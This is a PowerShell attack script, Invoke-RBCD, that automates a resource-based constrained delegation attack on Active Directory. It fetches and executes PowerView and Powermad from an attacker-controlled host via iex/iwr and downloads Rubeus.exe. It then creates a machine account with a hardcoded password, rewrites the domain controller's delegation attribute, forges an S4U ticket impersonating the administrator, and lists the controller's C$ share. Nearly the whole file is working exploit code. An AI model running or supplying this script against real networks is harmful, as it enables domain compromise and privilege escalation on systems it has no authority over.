function Invoke-RBCD { 

    [cmdletbinding()] 
    Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [string]
        $LHOST,

        [Parameter(Position = 1, Mandatory = $true)]
        [string]
        $LPORT = 80, # default LPORT if none is given

        [Parameter(ParameterSetName="help")]
        [Switch]
        $help
    )

    if ($help) {
        Write-Host "This script checks if any domain user has the necessary access rights on computers in the domain." 
        Write-Host "Usage: Invoke-RBCD -LHOST <IP> -LPORT <Port>"
        return
    }

    # Define the output folder and file
    $outputFolder = "C:\temp"
    $outputFile = "$outputFolder\rbcd.txt"

    # Check if the folder exists, if not, create it
    if (-not (Test-Path -Path $outputFolder)) {
        Write-Host "Folder $outputFolder does not exist. Creating it now." -ForegroundColor Cyan
        New-Item -Path $outputFolder -ItemType Directory
    }

    Read-Host "Start web server on $LHOST port $LPORT, where PowerView.ps1 resides, press enter to continue"

    # Import the PowerView module
    iex (iwr -Uri "http://${LHOST}:${LPORT}/PowerView.ps1" -UseBasicParsing)

    # Get all computers in the domain
    $computers = Get-DomainComputer

    # Get all users in the domain
    $users = Get-DomainUser

    # Define the required access rights
    $accessRights = "GenericWrite", "GenericAll", "WriteProperty", "WriteDacl"

    # Loop through each computer in the domain
    foreach ($computer in $computers) {
        # Get the security descriptor for the computer
        $acl = Get-ObjectAcl -SamAccountName $computer.SamAccountName

        # Loop through each user in the domain
        foreach ($user in $users) {
            # Check if the user has the required access rights on the computer object
            $hasAccess = $acl | Where-Object { $_.SecurityIdentifier -eq $user.ObjectSID } | ForEach-Object {
                $_.ActiveDirectoryRights -match ($accessRights -join '|')
            }
            if ($hasAccess) {
                # Write the output to the file
                Write-Host "$($user.SamAccountName) has the required access rights." -ForegroundColor Green

                # Ask the user for which account has RBCD rights and ensure they input something
                $useraccess = $null
                while (-not $useraccess) {
                    $useraccess = Read-Host "Please type which user has RBCD rights that you want to use (you also need their password)"
                    
                    if (-not $useraccess) {
                        Write-Host "You must provide a user with RBCD rights. If none press Ctrl+C to exit script." -ForegroundColor Red
                    }
                }

                # Output the selected user to the file
                $useraccess | Out-File -FilePath $outputFile
                Write-Host "User with RBCD rights selected: $useraccess"
            }
        }
    }

    # Check if the file exists and is not empty
    if (Test-Path $outputFile) {
        $fileSize = (Get-Item $outputFile).length
        if ($fileSize -eq 0) {
            Write-Host "$outputFile is empty, no users have RBCD." -ForegroundColor Red
            exit
        }

        # Reading the user access from the file
        $useraccess = Get-Content -Path $outputFile

        # Prompt for password
        $response = Read-Host "Do you have the password for user $useraccess? (Y/N)"
        if ($response -eq "Y" -or $response -eq "y") {
            # If the user has the password, prompt for the password securely
            $outputDomain = "C:\temp\domain_name.txt"
            $outputDomainController = "C:\Temp\domain_controller_name.txt"
            
            # Write the domain name to the file
            (Get-NetDomain).Name | Out-File -FilePath $outputDomain
            (Get-NetDomainController).name | Out-File -FilePath $outputDomainController
            
            # Now you can read the content of the file
            $domainContent = Get-Content -Path $outputDomain
            $domainControllerContent = Get-Content -Path $outputDomainController
            
            $password = Read-Host "Enter the password" 

            Write-Host "User has RBCD, start web server where Powermad.ps1 is on ${LHOST} on ${LPORT}" -ForegroundColor Cyan
            iex (iwr -Uri "http://${LHOST}:${LPORT}/Powermad.ps1" -UseBasicParsing)

            Write-Host "Creating Machine Account OGC with Password P@ssw0rd1234!@#$" -ForegroundColor Green
            New-MachineAccount -MachineAccount OGC -Password $(ConvertTo-SecureString "P@ssw0rd1234!@#$" -AsPlainText -Force)

            # Re-import PowerView.ps1 and continue processing
            iex (iwr -Uri "http://${LHOST}:${LPORT}/PowerView.ps1" -UseBasicParsing)

            $ComputerSid = Get-DomainComputer OGC -Properties objectsid | Select -Expand objectsid
            $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
            $SDBytes = New-Object byte[] ($SD.BinaryLength)
            $SD.GetBinaryForm($SDBytes, 0)

            # Create credentials for the user
            Write-Host "Using credentials $domainContent\$useraccess with password $password" -ForegroundColor Cyan
            $credentials = New-Object System.Management.Automation.PSCredential "$domainContent\$useraccess", $password

            # Set domain object
            Get-DomainComputer $outputDomainController | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Credential $credentials -Verbose
            Get-NetDomainController | Select-Object -ExpandProperty Name | Out-File -FilePath "C:\temp\domaincontroller_name.txt"

            # Download and run Rubeus
            Write-Host "Downloading Rubeus from $LHOST on $LPORT press enter when ready" -ForegroundColor Cyan
            cd C:\Temp
            wget -usebasicparsing http://${LHOST}:${LPORT}/Rubeus.exe -o Rubeus.exe
            Write-Host "Running Rubeus for user OGC$ with password P@ssw0rd1234!@#$ on domain $domainContent" -ForegroundColor Cyan
            $rubout = .\Rubeus.exe hash /password:P@ssw0rd1234!@#$ /user:OGC /domain:${domainContent}
            
            # Filter out the rc4_hmac value using regex and select the first match
            $rc4Hash = $rubout | Select-String -Pattern "rc4_hmac\s+:\s+([A-F0-9]+)" | ForEach-Object { $_.Matches.Groups[1].Value }
            Write-Host "Hash is ${rc4Hash}" -ForegroundColor Cyan
            
            .\Rubeus.exe s4u /user:OGC$ /rc4:$rc4Hash /impersonateuser:administrator /msdsspn:cifs/${domainControllerContent} /ptt
            klist
            ls \\${domainControllerContent}\c$
        }

        if ($response -eq "N" -or $response -eq "n") {
            # If the user doesn't have the password, exit the script
            Write-Host "Exiting the script as the password is not provided." -ForegroundColor Red
            sleep 5
            exit
        }
    }
}
